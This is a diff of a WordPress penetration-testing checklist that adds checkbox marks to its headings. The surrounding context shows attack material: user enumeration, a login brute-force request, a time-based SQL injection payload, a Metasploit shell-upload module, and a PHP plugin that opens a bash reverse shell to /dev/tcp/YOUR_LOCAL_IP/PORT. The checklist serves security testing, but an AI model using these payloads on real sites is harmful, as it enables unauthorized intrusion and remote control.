@@ -115,7 +115,7 @@ wpscan --url https://target.com -e u
 
 ---
 
-### Username Exposure
+### ☐ Username Exposure
 
 - You can extract usernames using these paths:
   ```
@@ -129,7 +129,7 @@ wpscan --url https://target.com -e u
 
 ---
 
-### ID Brute-Force
+### ☐ ID Brute-Force
 
 #### Case (1): Brute-Force users IDs
 ```bash
@@ -204,7 +204,7 @@ log=USERNAME&pwd=PASSWORD&wp-submit=Log+In&redirect_to=http://target.com/wp-admi
 
 ---
 
-### Port Scanning (XSPA)
+### ☐ Port Scanning (XSPA)
 
 - If you find the method pingback.ping inside the list, you have two cases:
 #### Case (1): Internal port scanning
@@ -245,7 +245,7 @@ nc -lvnp 4444
 
 ---
 
-### Blind SSRF
+### ☐ Blind SSRF
 
 - Use Burp Collaborator:
 ```xml
@@ -262,7 +262,7 @@ nc -lvnp 4444
 
 ---
 
-### `/wp-json/oembed/1.0/proxy` SSRF
+### ☐ `/wp-json/oembed/1.0/proxy` SSRF
 
 - Test:
 ```
@@ -281,7 +281,7 @@ Payload: ‘%2b(select*from(select(sleep(10)))a)$2b’
 
 ---
 
-### DoS via `wp-cron.php`
+### ☐ DoS via `wp-cron.php`
 
 - URL: `/wp-cron.php`
 - Can cause DoS on high traffic sites.
@@ -298,7 +298,7 @@ Payload: ‘%2b(select*from(select(sleep(10)))a)$2b’
 
 ---
 
-###  Open A Session (Metasploit)
+###  ☐ Open a session (Metasploit)
 
 ```bash
 use exploit/unix/webapp/wp_admin_shell_upload
@@ -306,13 +306,13 @@ use exploit/unix/webapp/wp_admin_shell_upload
 
 ---
 
-###  Remote Code Execution (RCE) via XML-RPC
+### ☐ Remote Code Execution (RCE) via XML-RPC
 
 - Ref: https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s
 
 ---
 
-###  PHP Plugin Remote Code Execution (RCE)
+### ☐ PHP Plugin Remote Code Execution (RCE)
 
 - Payload:
 ```php
@@ -322,7 +322,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_LOCAL_IP/PORT 0>&1'");
 ```
 
 - Upload as plugin and activate.
-- Ref: https://www.hackingarticles.in/wordpress-reverse-shell
+- Ref: `https://www.hackingarticles.in/wordpress-reverse-shell`
 
 
 ---
